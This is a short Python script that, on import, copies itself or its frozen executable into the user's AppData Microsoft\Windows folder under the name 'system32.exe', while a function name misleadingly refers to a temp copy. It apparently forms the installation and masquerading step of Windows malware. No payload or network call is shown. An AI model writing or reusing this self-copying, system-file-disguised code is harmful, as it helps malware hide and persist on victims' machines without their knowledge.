import os
import sys
import shutil
import tempfile
import uuid
from pathlib import Path

def copy_to_temp() -> str:
    if getattr(sys, "frozen", False):
        source = Path(sys.executable).resolve()
    else:
        source = Path(__file__).resolve()

    name = "system32.exe"
    dest = Path(os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')) / name
    shutil.copy2(str(source), str(dest))
    return str(dest)

TEMP_PATH = copy_to_temp()